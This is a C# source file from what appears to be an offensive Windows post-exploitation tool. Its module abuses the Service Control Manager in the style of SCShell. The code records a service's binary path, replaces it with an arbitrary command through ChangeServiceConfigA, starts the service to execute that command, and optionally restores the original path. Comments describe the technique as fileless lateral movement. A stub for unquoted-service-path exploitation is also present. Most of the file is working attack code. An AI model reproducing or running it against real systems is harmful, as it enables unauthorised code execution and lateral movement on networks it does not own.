using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.ServiceProcess;
using System.Runtime.InteropServices;



namespace Vidian.Modules.Services
{
    class Services
    {

        // Useless en vrai, à virer ?
        public static void listServices()
        {
            Utils.print.white("\t[*] Discovered services : ");

            ServiceController[] serviceList = ServiceController.GetServices();

            foreach (ServiceController service in serviceList)
            {
                Utils.print.white("\tName : " + service.ServiceName);
                Utils.print.white("\tStatus: " + service.Status);
            }
        }

        // Modify service binpath, execute, put back original binpath
        //https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/scshell-fileless-lateral-movement-using-service-manager/
        //https://gist.github.com/FusRoDah061/d04dc0bbed890ba0e93166da2b62451e
        /* 
         * Lots of code taken from https://github.com/Mr-Un1k0d3r/SCShell/blob/master/SharpSCShell.cs
         * 
        */
        public static void modifyService(string serviceName, string binPath, bool execute, bool revert)
        {
            int bytesNeeded = 5;
            const uint SERVICE_NO_CHANGE = 0xffffffff;
            const int SERVICE_DEMAND_START = 0x00000003;
            const int SERVICE_ERROR_IGNORE = 0x00000000;
            try
            {
                Utils.print.white("\t[*] Modifying the following service : " + serviceName);

                IntPtr schManager = ServiceUtils.OpenSCManager(null, null, ServiceUtils.SCM_ACCESS.GENERIC_READ);
                if (schManager == IntPtr.Zero)
                {
                    Utils.print.red("[-] OpenSCManagerA failed!Error:{ 0} "+ ServiceUtils.GetLastError());
                    return;
                }
                    
                IntPtr serviceHandle = ServiceUtils.OpenService(schManager, serviceName, ServiceUtils.SERVICE_ACCESS.SERVICE_MODIFY_EXECUTE);
                if (serviceHandle == IntPtr.Zero)
                {
                    Utils.print.red("[-] OpenService failed!Error:{ 0} " + ServiceUtils.GetLastError());
                    return;
                }
                
                bool callResult;
                ServiceUtils.QueryServiceConfigStruct qscs = new ServiceUtils.QueryServiceConfigStruct();
                IntPtr qscPtr = Marshal.AllocCoTaskMem(0);
                int retCode = ServiceUtils.QueryServiceConfig(serviceHandle, qscPtr, 0, ref bytesNeeded);
                if (retCode == 0 && bytesNeeded == 0)
                {
                    Utils.print.red("\t[-] QueryServiceConfig failed to read the service path. Error: " + ServiceUtils.GetLastError());
                    return;
                }
                else
                {
                    Utils.print.green("\t[+] LPQUERY_SERVICE_CONFIGA need " + bytesNeeded + " bytes");
                    qscPtr = Marshal.AllocCoTaskMem(bytesNeeded);
                    retCode = ServiceUtils.QueryServiceConfig(serviceHandle, qscPtr, bytesNeeded, ref bytesNeeded);
                    qscs.binaryPathName = IntPtr.Zero;
                    qscs = (ServiceUtils.QueryServiceConfigStruct)Marshal.PtrToStructure(qscPtr, new ServiceUtils.QueryServiceConfigStruct().GetType());
                }

                string originalBinaryPath = Marshal.PtrToStringAuto(qscs.binaryPathName);
                Utils.print.white("\t[*] Original binpath : " + originalBinaryPath);
                Marshal.FreeCoTaskMem(qscPtr);

                callResult = ServiceUtils.ChangeServiceConfigA(serviceHandle, SERVICE_NO_CHANGE, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, binPath, null, null, null, null, null, null);
                if (callResult)
                {
                    Utils.print.green("\t[+] Modified the following service : " + serviceName);
                }
                else
                {
                    Utils.print.red("\t[-] Could not modify the service : " + serviceName);
                    Utils.print.red("\tError : " + ServiceUtils.GetLastError());
                    return;
                }
                
                if (execute)
                {
                    Utils.print.white("\t[*] Executing service after modification : " + serviceName);
                    callResult = ServiceUtils.StartService(serviceHandle, 0, null);
                    uint dwResult = ServiceUtils.GetLastError();
                    if (!callResult && dwResult != 1053)
                    {
                        Utils.print.red("\t[-] Could not start service : " + serviceName + ", Error : " + ServiceUtils.GetLastError());
                        return;
                    }
                    else
                    {
                        Utils.print.green("\t[+] Started service " + serviceName);
                    }
                                    
                }
                else
                {
                    Utils.print.white("\t[!] Service : " + serviceName + " will not be started, pass --execute after modification");
                    return;
                }
                
                if (revert)
                {
                    Utils.print.white("\t[*] Current binpath : " + binPath);
                    if (callResult = ServiceUtils.ChangeServiceConfigA(serviceHandle, SERVICE_NO_CHANGE, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, originalBinaryPath, null, null, null, null, null, null))
                    {
                        Utils.print.green("\t[+] binpath was reverted to original value: " + serviceName);
                    }
                    else
                    {
                        Utils.print.red("\t[-] Could not modify the service : " + serviceName);
                        Utils.print.red("\tError : " + ServiceUtils.GetLastError());
                    }
                }
                else 
                {
                    Utils.print.white("\t[!] Service : " + serviceName + "'s original binpath will not be put back, pass --revert after modification and execution");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
        }

        public static void exploitUnquoted(string serviceName, string binPath, bool execute, bool revert) 
        {
            Utils.print.red("[-] Not implemented yet");
        }
    }
}

